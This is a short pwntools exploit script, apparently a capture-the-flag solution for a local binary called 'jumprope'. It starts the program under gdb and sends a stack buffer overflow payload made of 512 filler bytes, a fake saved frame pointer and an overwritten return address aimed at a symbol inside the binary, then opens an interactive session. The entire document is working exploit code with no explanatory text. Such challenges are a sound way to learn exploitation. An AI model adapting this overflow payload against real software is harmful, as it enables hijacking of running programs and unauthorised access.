from pwn import *

context.arch='amd64'
LIBC = "/lib/x86_64-linux-gnu/libc.so.6"

p = gdb.debug("./jumprope" , """
             b *main
             b *jumprope+54
             c
             c
              """)


libc = ELF(LIBC, checksec=False)
elf = ELF("./jumprope", checksec=False)

welcome_message = p.recvuntil(b"Better start jumping!")

print(f"a symbol address {hex(elf.sym.a)}")

RBP = p64(0xdeadc0de)
RETURN_ADDRESS = p64(elf.sym.a + 5)
p.sendline(b"A" * 512 + RBP + RETURN_ADDRESS)


p.interactive()
